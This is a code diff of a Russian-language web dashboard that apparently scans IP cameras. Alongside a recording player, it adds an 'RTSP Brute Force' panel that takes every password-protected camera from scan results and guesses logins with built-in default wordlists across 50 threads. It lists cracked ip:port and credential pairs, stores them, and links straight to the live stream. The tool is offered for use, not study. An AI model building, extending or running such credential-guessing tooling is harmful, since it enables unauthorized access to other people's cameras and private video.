+        if (nextBtn) nextBtn.disabled = curEnd >= data.total;
+
+        if (!data.records.length) {
+            if (tbody) tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;padding:1.5rem;color:#94a3b8">Записей нет</td></tr>`;
+            return;
+        }
+
+        const activeId = window.V2SpRecordState.currentRecord?.id || data.records[0].id;
+
+        tbody.innerHTML = data.records.map((r, idx) => {
+            const isCur = r.id === activeId;
+            return `
+                <tr id="v2-sp-row-${r.id}" style="${isCur ? 'background:rgba(16,185,129,0.15);font-weight:600' : ''}">
+                    <td style="color:${isCur ? '#34d399' : '#94a3b8'}">${isCur ? '▶ ' : ''}${offset + idx + 1}</td>
+                    <td><strong style="color:#e2e8f0">${_esc(r.time || '–')}</strong></td>
+                    <td><span style="color:#6ee7b7;background:rgba(16,185,129,0.12);padding:2px 6px;border-radius:4px;font-size:0.75rem">${_esc(r.channel || 'Канал')}</span></td>
+                    <td><span style="font-family:monospace;color:#f1f5f9">${_esc(r.duration || '00:00:00')}</span></td>
+                    <td><span style="font-family:monospace;font-size:0.72rem;color:#64748b">${_esc(r.filename || '')}</span></td>
+                    <td style="text-align:right">
+                        <button class="v2-btn-small" style="padding:2px 8px;font-size:0.75rem;background:rgba(16,185,129,0.25);color:#34d399;border:1px solid rgba(16,185,129,0.4)" onclick="v2PlaySpRecordById('${_esc(ip)}', ${r.id})">▶ Слушать</button>
+                        <a href="${_esc(r.download_url)}" target="_blank" download class="v2-btn-small" style="padding:2px 8px;font-size:0.75rem;background:rgba(255,255,255,0.08);color:#cbd5e1;border:1px solid rgba(255,255,255,0.15);text-decoration:none;margin-left:4px">⬇ MP3</a>
+                    </td>
+                </tr>
+            `;
+        }).join('');
+
+        if (!window.V2SpRecordState.currentRecord && data.records.length > 0) {
+            v2SetSpRecordTrack(ip, data.records[0], false);
+        }
+    } catch (err) {
+        if (tbody) tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;padding:1.5rem;color:#f87171">Сетевая ошибка: ${err.message}</td></tr>`;
+    }
+}
+window.v2LoadSpRecordPage = v2LoadSpRecordPage;
+
+function v2PlaySpRecordById(ip, recordId) {
+    const rec = (window.V2SpRecordState.records || []).find(r => r.id === recordId) || {
+        id: recordId,
+        audio_url: `/api/v2/sprecord/audio?ip=${encodeURIComponent(ip)}&record_id=${recordId}`,
+        download_url: `/api/v2/sprecord/audio?ip=${encodeURIComponent(ip)}&record_id=${recordId}&download=1`,
+        channel: 'Запись #' + recordId,
+        time: '',
+        duration: '',
+    };
+    v2SetSpRecordTrack(ip, rec, true);
+}
+window.v2PlaySpRecordById = v2PlaySpRecordById;
+
+function v2SetSpRecordTrack(ip, rec, autoplay = true) {
+    window.V2SpRecordState.currentRecord = rec;
+    const audio = document.getElementById('v2-sprecord-audio-elem');
+    const titleElem = document.getElementById('v2-sprecord-cur-title');
+    const downLink = document.getElementById('v2-sprecord-download-link');
+    const title = rec.channel ? `${rec.channel} · ${rec.time} (${rec.duration})` : `Запись #${rec.id}`;
+
+    if (titleElem) titleElem.textContent = title;
+    if (downLink) {
+        downLink.href = rec.download_url;
+        downLink.style.display = 'inline-block';
+    }
+    if (audio) {
+        audio.src = rec.audio_url;
+        if (autoplay) {
+            audio.play().catch(() => {});
+        }
+    }
+
+    // Highlight active row in table
+    const tbody = document.getElementById('v2-sprecord-tbody');
+    if (tbody) {
+        tbody.querySelectorAll('tr').forEach(tr => {
+            const isMatch = tr.id === `v2-sp-row-${rec.id}`;
+            tr.style.background = isMatch ? 'rgba(16,185,129,0.15)' : '';
+            tr.style.fontWeight = isMatch ? '600' : '';
+        });
+    }
+}
+window.v2SetSpRecordTrack = v2SetSpRecordTrack;
 
 
 // ════════════════════════════════════════════════════════════════
@@ -1620,6 +1988,227 @@ function v2ExportJson() {
 }
 window.v2ExportJson = v2ExportJson;
 
+function v2Export401() {
+    window.open('/api/v2/export/401?format=txt', '_blank');
+}
+window.v2Export401 = v2Export401;
+
+// ── RTSP Brute Force Modal & Real-time Runner ───────────────────────
+let _v2BruterPollTimer = null;
+
+function v2OpenBruterModal() {
+    document.getElementById('v2-bruter-modal-overlay')?.remove();
+
+    const cameras401 = (window.V2State.results || []).filter(window._isCam401 || (c => c.auth_required));
+    const count401 = cameras401.length;
+
+    const overlay = document.createElement('div');
+    overlay.className = 'v2-modal-overlay';
+    overlay.id = 'v2-bruter-modal-overlay';
+    overlay.onclick = (e) => { if (e.target === overlay) v2CloseBruterModal(); };
+
+    const defaultUsers = 'admin\nroot\nservice\nuser\noperator\nviewer';
+    const defaultPass = '\nadmin\n12345\n123456\n12345678\nadmin123\nadmin12345\n12345admin\nroot\npass\npassword\nservice\n1111\n666666';
+
+    overlay.innerHTML = `
+        <div class="v2-modal-content" style="max-width:760px">
+            <div class="v2-modal-header">
+                <div class="v2-modal-title">
+                    <span>🔨</span>
+                    <span>RTSP Brute Force (/root/rtspBruter)</span>
+                </div>
+                <button class="v2-modal-close" onclick="v2CloseBruterModal()">✕</button>
+            </div>
+            <div class="v2-modal-body" style="padding:1.25rem;display:flex;flex-direction:column;gap:1rem;overflow-y:auto;max-height:calc(85vh - 70px);">
+                <!-- Target Summary -->
+                <div style="background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.35);padding:10px 14px;border-radius:8px;font-size:0.85rem;color:#fde68a;display:flex;align-items:center;justify-content:space-between">
+                    <div>
+                        <strong>🎯 Камеры для подбора:</strong>
+                        <span>${count401 > 0 ? `${count401} камер с 401 в результатах` : 'Все камеры с ошибкой 401 из базы'}</span>
+                    </div>
+                    <button class="v2-btn-small" onclick="v2Export401()" title="Скачать targets.txt для ручного запуска">⬇ Скачать targets.txt</button>
+                </div>
+
+                <!-- Wordlists and Settings -->
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+                    <div>
+                        <label style="display:block;font-size:0.75rem;font-weight:600;color:#94a3b8;margin-bottom:4px">Логины (один на строку):</label>
+                        <textarea id="v2-brute-users" style="width:100%;height:100px;background:#020617;border:1px solid rgba(255,255,255,0.12);border-radius:6px;color:#e2e8f0;font-size:0.75rem;font-family:monospace;padding:6px;resize:none">${defaultUsers}</textarea>
+                    </div>
+                    <div>
+                        <label style="display:block;font-size:0.75rem;font-weight:600;color:#94a3b8;margin-bottom:4px">Пароли (первая пустая = без пароля):</label>
+                        <textarea id="v2-brute-passwords" style="width:100%;height:100px;background:#020617;border:1px solid rgba(255,255,255,0.12);border-radius:6px;color:#e2e8f0;font-size:0.75rem;font-family:monospace;padding:6px;resize:none">${defaultPass}</textarea>
+                    </div>
+                </div>
+
+                <!-- Threads & Options -->
+                <div style="display:flex;align-items:center;gap:16px;font-size:0.8rem;color:#cbd5e1">
+                    <div style="display:flex;align-items:center;gap:8px">
+                        <span>Потоков (Threads):</span>
+                        <input type="number" id="v2-brute-threads" value="50" min="1" max="200" style="width:70px;background:#020617;border:1px solid rgba(255,255,255,0.12);color:#e2e8f0;padding:4px 8px;border-radius:4px;font-size:0.8rem">
+                    </div>
+                    <div style="color:rgba(255,255,255,0.45);font-size:0.75rem">
+                        ✓ При успехе пароль сохраняется в базу и автоматически захватывается превью!
+                    </div>
+                </div>
+
+                <!-- Action buttons -->
+                <div style="display:flex;align-items:center;gap:10px;margin-top:4px">
+                    <button class="v2-btn-small" id="v2-btn-start-brute" style="background:linear-gradient(135deg, #10b981, #059669);color:#fff;font-weight:600;padding:6px 14px" onclick="v2StartBruter()">▶ Запустить брутфорс</button>
+                    <button class="v2-btn-small v2-btn-danger" id="v2-btn-stop-brute" style="display:none;padding:6px 14px" onclick="v2StopBruter()">⏹ Остановить</button>
+                    <span id="v2-brute-status-indicator" style="font-size:0.8rem;color:#94a3b8;margin-left:auto">Готов к запуску</span>
+                </div>
+
+                <!-- Terminal / Console Log -->
+                <div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:4px">
+                        <span style="font-size:0.75rem;font-weight:600;color:#94a3b8">Лог работы rtspBrute:</span>
+                        <span id="v2-brute-cracked-stats" style="font-size:0.75rem;color:#4ade80;font-weight:600">✓ Подобрано: 0</span>
+                    </div>
+                    <div class="v2-bruter-console" id="v2-bruter-log">Ожидание запуска задачи...</div>
+                </div>
+
+                <!-- Cracked cameras list -->
+                <div id="v2-bruter-cracked-section" style="display:none">
+                    <div style="font-size:0.75rem;font-weight:700;color:#4ade80;margin-bottom:6px">Успешно подобраны пароли:</div>
+                    <div id="v2-bruter-cracked-list" style="display:flex;flex-direction:column;gap:6px;max-height:140px;overflow-y:auto"></div>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.body.appendChild(overlay);
+    v2CheckBruterStatusOnOpen();
+}
+window.v2OpenBruterModal = v2OpenBruterModal;
+
+function v2CloseBruterModal() {
+    if (_v2BruterPollTimer) {
+        clearInterval(_v2BruterPollTimer);
+        _v2BruterPollTimer = null;
+    }
+    document.getElementById('v2-bruter-modal-overlay')?.remove();
+}
+window.v2CloseBruterModal = v2CloseBruterModal;
+
+async function v2CheckBruterStatusOnOpen() {
+    try {
+        const resp = await fetch('/api/v2/bruter/status');
+        if (!resp.ok) return;
+        const data = await resp.json();
+        v2UpdateBruterUI(data);
+        if (data.is_running) {
+            _v2StartBruterPolling();
+        }
+    } catch (e) {}
+}
+
+function _v2StartBruterPolling() {
+    if (_v2BruterPollTimer) clearInterval(_v2BruterPollTimer);
+    _v2BruterPollTimer = setInterval(async () => {
+        try {
+            const resp = await fetch('/api/v2/bruter/status');
+            if (!resp.ok) return;
+            const data = await resp.json();
+            v2UpdateBruterUI(data);
+            if (!data.is_running) {
+                clearInterval(_v2BruterPollTimer);
+                _v2BruterPollTimer = null;
+                // Reload stored results to show updated cracked cameras
+                if (window.v2LoadStoredResults) v2LoadStoredResults(true);
+            }
+        } catch (e) {}
+    }, 1500);
+}
+
+function v2UpdateBruterUI(data) {
+    const startBtn = document.getElementById('v2-btn-start-brute');
+    const stopBtn = document.getElementById('v2-btn-stop-brute');
+    const indicator = document.getElementById('v2-brute-status-indicator');
+    const logBox = document.getElementById('v2-bruter-log');
+    const crackedStats = document.getElementById('v2-brute-cracked-stats');
+    const crackedSec = document.getElementById('v2-bruter-cracked-section');
+    const crackedList = document.getElementById('v2-bruter-cracked-list');
+
+    if (startBtn && stopBtn) {
+        startBtn.style.display = data.is_running ? 'none' : 'inline-block';
+        stopBtn.style.display = data.is_running ? 'inline-block' : 'none';
+    }
+
+    if (indicator) {
+        if (data.is_running) {
+            indicator.innerHTML = `<span style="color:#34d399;font-weight:600">⚡ Выполняется... (${data.elapsed_seconds || 0}с, целей: ${data.total_targets})</span>`;
+        } else if (data.status === 'finished') {
+            indicator.innerHTML = `<span style="color:#4ade80;font-weight:600">✓ Завершено (Взломано: ${data.cracked_count})</span>`;
+        } else if (data.status === 'stopped') {
+            indicator.innerHTML = `<span style="color:#f87171">⏹ Остановлено</span>`;
+        } else if (data.status === 'error') {
+            indicator.innerHTML = `<span style="color:#f87171">⚠️ Ошибка: ${_esc(data.error || 'unknown')}</span>`;
+        }
+    }
+
+    if (crackedStats) {
+        crackedStats.textContent = `✓ Подобрано: ${data.cracked_count || 0}`;
+    }
+
+    if (logBox && data.logs && data.logs.length) {
+        logBox.textContent = data.logs.join('\n');
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    if (crackedSec && crackedList && data.cracked_cameras && data.cracked_cameras.length) {
+        crackedSec.style.display = 'block';
+        crackedList.innerHTML = data.cracked_cameras.map(c => `
+            <div style="background:rgba(16,185,129,0.15);border:1px solid rgba(16,185,129,0.3);padding:6px 10px;border-radius:6px;display:flex;align-items:center;justify-content:space-between;font-size:0.75rem">
+                <div>
+                    <strong style="color:#e2e8f0">${_esc(c.ip)}:${c.port}</strong>
+                    <span style="color:#34d399;margin-left:8px;font-weight:600">🔑 ${_esc(c.user || 'none')}:${_esc(c.password || '')}</span>
+                </div>
+                <button class="v2-btn-small" onclick="v2CloseBruterModal();v2OpenSelectedStreamPlayer('${_esc(c.ip)}')" style="padding:2px 8px;font-size:0.7rem">▶ Просмотр</button>
+            </div>
+        `).join('');
+    }
+}
+
+async function v2StartBruter() {
+    const usersTxt = document.getElementById('v2-brute-users')?.value || '';
+    const passTxt = document.getElementById('v2-brute-passwords')?.value || '';
+    const threads = parseInt(document.getElementById('v2-brute-threads')?.value || '50', 10);
+
+    const usernames = usersTxt.split('\n').map(u => u.trim()).filter(Boolean);
+    const passwords = passTxt.split('\n');
+
+    try {
+        const resp = await fetch('/api/v2/bruter/start', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                usernames: usernames,
+                passwords: passwords,
+                threads: threads,
+            }),
+        });
+        const data = await resp.json();
+        if (data.started) {
+            _showV2Toast(`Запущен подбор паролей для ${data.total_targets} камер!`);
+            _v2StartBruterPolling();
+        } else {
+            alert(data.message || 'Не удалось запустить брутфорс');
+        }
+    } catch (e) {
+        alert('Ошибка запуска: ' + e.message);
+    }
+}
+window.v2StartBruter = v2StartBruter;
+
+async function v2StopBruter() {
+    try {
+        await fetch('/api/v2/bruter/stop', { method: 'POST' });
+        _showV2Toast('Остановка процесса брутфорса...');
+    } catch (e) {}
+}
+window.v2StopBruter = v2StopBruter;
+
 async function v2ClearResults() {
     if (!confirm('Удалить все результаты v2 из базы данных?')) return;
     await fetch('/api/v2/results', { method: 'DELETE' });
@@ -1734,7 +2323,7 @@ async function v2StartBulkCapture(btn) {
             body: JSON.stringify({
                 concurrency: 2,
                 only_unverified: true,
-                max_streams_per_cam: 4,
+                max_streams_per_cam: 0,
             })
         });
         const data = await resp.json();
@@ -1862,13 +2451,22 @@ function v2SetFilter(type, value) {
         const activeVal = window.V2State.filterStatus;
         document.getElementById('v2-filter-status-live')?.classList.toggle('active', activeVal === 'live');
         document.getElementById('v2-filter-status-preview')?.classList.toggle('active', activeVal === 'preview');
+    } else if (type === 'auth') {
+        const cur = window.V2State.filterAuth || 'all';
+        window.V2State.filterAuth = (cur === value) ? 'all' : value;
+        const activeVal = window.V2State.filterAuth;
+        document.getElementById('v2-filter-auth-open')?.classList.toggle('active', activeVal === 'open');
+        document.getElementById('v2-filter-auth-401')?.classList.toggle('active', activeVal === '401');
     } else if (type === 'brand') {
         window.V2State.filterBrand = value;
         if (value === 'all') {
             window.V2State.filterProtocol = 'all';
             window.V2State.filterStatus = 'all';
+            window.V2State.filterAuth = 'all';
             document.querySelectorAll('.v2-filter-btn').forEach(btn => btn.classList.remove('active'));
             document.getElementById('v2-filter-brand-all')?.classList.add('active');
+            document.getElementById('v2-filter-auth-open')?.classList.remove('active');
+            document.getElementById('v2-filter-auth-401')?.classList.remove('active');
         } else {
             document.querySelectorAll('.v2-filter-btn[id^="v2-filter-brand-"]').forEach(btn => {
                 btn.classList.toggle('active', btn.dataset.value === value);
@@ -1883,7 +2481,8 @@ function v2SetFilter(type, value) {
 
     const isAll = window.V2State.filterBrand === 'all' &&
                   window.V2State.filterProtocol === 'all' &&
-                  (!window.V2State.filterStatus || window.V2State.filterStatus === 'all');
+                  (!window.V2State.filterStatus || window.V2State.filterStatus === 'all') &&
+                  (!window.V2State.filterAuth || window.V2State.filterAuth === 'all');
     document.getElementById('v2-filter-brand-all')?.classList.toggle('active', isAll);
 
     if (window.v2RenderResults) v2RenderResults();
